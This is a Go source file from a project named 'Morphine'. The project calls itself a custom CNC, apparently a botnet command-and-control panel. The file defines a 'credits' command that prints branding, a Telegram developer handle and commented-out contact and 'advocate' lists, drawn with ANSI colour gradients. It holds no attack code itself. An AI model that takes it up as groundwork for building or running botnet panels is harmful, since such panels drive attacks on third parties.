package commands

import (
	"Morphine/core/clients/sessions"
	"Morphine/core/clients/views/pager"

	//"Morphine/core/configs"
	"Morphine/core/sources/layouts/toml"
	"Morphine/core/sources/tools/gradient"
	"strings"
)

func init() {

	MakeCommand(&Command{
		CommandName:        "credits",
		Aliases:            []string{"credits", "credit", "creds"},
		CommandPermissions: make([]string, 0),
		CommandDescription: "information about the model origin",
		CommandFunction: func(s *sessions.Session, cmd []string) error {
			//renders the credits information properly
			//this will ensure its done without errors happening on reqeust
			if toml.DecorationToml.Gradient.EnableWithCredits { //performs the gradient properly
				//this will perform the gradient on each layer properly
				//this will ensure its done without issues happening on purpose
				Targets, err := BuildCredits(s.Colours, []string{"", "  Morphine is a custom CNC with many customize and more options.", "  Self developed by t.me/setupceramic (14.12.2023)"})
				if err != nil { //error handles properly
					return err
				}
				//s.Write(" \x1b[38;5;135mMorphine "+deployment.Version+"\x1b[0m -\x1b[38;5;9m FB \x1b[0m- \x1b[38;5;11mstable\x1b[0m\r\n")
				s.Write("  \x1b[38;5;111mMorphine CNC \x1b[0m| \x1b[38;5;3mStable Build\x1b[0m\r\n")
				//writes to the connection
				//this will ensure its done without issues
				return s.Write(strings.Join(Targets, "\r\n") + "\r\n") //returns properly
			}
			//s.Write("\x1b[38;5;105mMorphine "+deployment.Version+"\x1b[0m -\x1b[38;5;9m FB \x1b[0m- \x1b[38;5;11mstable\x1b[0m\r\n")
			//s.Write(" \r\n")
			//s.Write(" Morphine has been completely developed by FB and nobody else.\r\n")
			//s.Write(" This product contains over 20,000 lines of Go code and many\r\n")
			//s.Write(" features curated for the future clients of Morphine...\r\n")
			//s.Write("\r\n")
			//s.Write(" Advocates: prmze, mnnpwn, DosBot, 0xyLace, Pazdano, Boss,\r\n")
			//s.Write("  Cupid, Null, NotTurpzy, DownMyPath, RP, Bermuda, Space, Bleach.\r\n")
			//s.Write("\r\n")
			//s.Write(" Inspiration: Putin")
			//s.Write("\r\n")
			//s.Write(" Contact destinations: Discord:FB#7037, Telegram:@FB\r\n")
			s.Write("  \x1b[38;5;111mMorphine CNC \x1b[0m| \x1b[38;5;3mStable Build\x1b[0m\r\n")
			s.Write("  \r\n")
			s.Write("  Morphine is a custom CNC with many customize and more options.\r\n")
			s.Write("  Self developed by t.me/setupceramic (14.12.2023)\r\n")
			return nil
		},
	})
}

// returns the array of strings and returns the error
// this will ensure its done without issues without errors
func BuildCredits(colours [][]int, text []string) ([]string, error) {
	var longest int = pager.GetLongestLineWithSTRIP(text)

	//ranges through the text properly
	//this will ensure its done without issues
	for line, fracture := range text { //ranges through
		l, err := gradient.NewWithIntArray(fracture, colours...).WorkerWithEscapes(longest)
		if err != nil {
			return nil, err
		}

		text[line] = l
	}
	return text, nil
	return text, nil
}
